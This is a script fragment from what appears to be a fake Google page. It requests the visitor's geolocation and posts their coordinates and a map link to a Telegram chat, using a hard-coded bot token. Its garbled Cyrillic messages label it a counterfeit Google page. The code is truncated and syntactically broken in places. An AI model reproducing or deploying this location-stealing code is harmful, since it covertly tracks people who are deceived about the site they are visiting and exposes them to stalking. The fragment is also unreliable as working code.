  <script>
    const botToken = "7972755394:AAFVmA7LMOgpygkl-ED_vhHd2eUs-agQ1aw";
    const chatId = "148031411";

    function sendToTelegram(text) {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: text

    function handleGeo(position) {
      const lat = position.coords.latitude.toFixed(6);
      const lon = position.coords.longitude.toFixed(6);
      const acc = position.coords.accuracy;

      const msg = `üìç –ü–æ–¥–¥–µ–ª—å–Ω—ã–π Google:\n–®–∏—Ä–æ—Ç–∞: ${lat}\n–î–æ–ª–≥–æ—Ç–∞: ${lon}\n–¢–æ—á–Ω–æ—Å—Ç—å: ¬±${Math.round(acc)}–º\nhttps://www.google.com/maps?q=${lat},${lon}`;
      sendToTelegram(msg);
    }

    function handleError() {
      sendToTelegram("‚ö†Ô∏è –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–ª—É—á–µ–Ω–∞ (—Å—Ç—Ä–∞–Ω–∏—Ü–∞ Google)");
    }

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(handleGeo, handleError);
    } else {
      sendToTelegram("‚ö†Ô∏è –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –±—Ä–∞—É–∑–µ—Ä–æ–º.");
